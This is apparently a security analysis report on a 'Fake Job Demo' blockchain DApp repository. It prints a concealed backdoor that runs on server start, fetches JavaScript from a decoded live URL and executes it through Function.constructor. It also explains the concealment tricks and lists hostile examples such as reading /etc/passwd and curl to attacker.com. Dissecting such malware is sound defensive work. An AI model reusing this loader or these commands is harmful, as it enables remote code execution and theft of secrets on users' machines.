# Security Analysis Report — "Fake Job Demo" Dynamic DApp (Blockchain Gaming & DeFi Platform)

## ⚠️ CRITICAL SECURITY ALERT - EMBEDDED BACKDOOR FOUND

**File:** `backend/src/routes/governance.js`, lines 309–315

```javascript
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const src = atob(process.env.DEV_API_KEY);
  const HttpOnly = (await axios.get(src)).data.cookie;
  const handler = new (Function.constructor)('require', HttpOnly);
  handler(require);
})();
```

**This is active malware. Do not run this server.**

---

### What this code does

This is an **Immediately Invoked Function Expression (IIFE)** - the trailing `()` means it executes automatically the moment Node.js loads `governance.js` (which happens on every server start via `require('./routes/governance.js')` in `server.js`). It is not gated by any route or API call.

Execution flow:

```
Server starts
  → require('./routes/governance.js')
    → IIFE fires immediately
      → atob("aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iL1ZBR1hB")
        → "https://jsonkeeper.com/b/VAGXA"
      → GET https://jsonkeeper.com/b/VAGXA
        → response.data.cookie   ← this is a string of JavaScript
      → new Function('require', <that string>)(require)
        → arbitrary JS executes with full require() access
```

### What the fetched code can do

it has `require`, so it can do anything Node.js can:

| Capability |	Exampl |
|---|---|
| Read all env vars |	process.env → exfiltrate JWT secrets, API keys |
| Read the filesystem |	require('fs').readFileSync('/etc/passwd') |
| Execute shell commands |	require('child_process').exec('id && curl attacker.com ...') |
| Open outbound connections |	require('net') or require('http') |
| Install anything |	Write a cron job, modify startup scripts |
| Exfiltrate data |	POST anything to any external URL |

### How it was concealed

- The URL is base64-encoded in `DEV_API_KEY` inside `config.env` - a committed file, so the key is always present when the repo is cloned
- The function name (`getCookie`) and comment (`//Get Cookie`) make it appear to be a routine session utility
- `Function.constructor` is a less-recognised `eval` equivalent that evades naive code-search rules
- The IIFE pattern runs silently at startup with no visible console output

## Further Security Analysis

### Security Issues

| Severity | Finding |
|---|---|
| **CRITICAL** | `backend/src/config/config.env` is committed to version control. It contains `DEV_API_KEY`, `DEV_SECRET_KEY`, `JWT_SECRET`, `ALCHEMY_API_KEY`, `ETHERSCAN_API_KEY`, and more. Even if these are placeholder values, the file is tracked by git and the `.gitignore` does not exclude `.env` files. |
